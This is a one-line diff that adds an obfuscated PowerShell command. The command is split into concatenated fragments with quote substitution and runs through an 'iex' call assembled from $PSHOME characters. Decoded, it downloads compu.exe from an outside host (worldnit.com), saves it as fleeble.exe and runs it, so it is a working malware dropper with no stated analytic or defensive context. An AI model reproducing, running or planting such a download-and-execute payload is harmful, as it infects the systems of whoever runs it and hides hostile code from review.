@@ -1,0 +1,1 @@
+﻿ (('(Ne'+'w-Obj'+'ect '+'Sy'+'stem.'+'Net'+'.WebCl'+'ien'+'t)'+'.Do'+'w'+'n'+'lo'+'adF'+'i'+'le(HvUhtt'+'p'+'://'+'world'+'ni'+'t.'+'com/'+'co'+'mpu.exeHv'+'U,'+'HvU'+'fleeb'+'le.e'+'xeHvU'+')'+';Start-P'+'rocess'+' Hv'+'U'+'flee'+'b'+'le.ex'+'eHv'+'U')-CrePLACe'HvU',[char]39)|& ( $PSHOmE[4]+$pShomE[34]+'X')
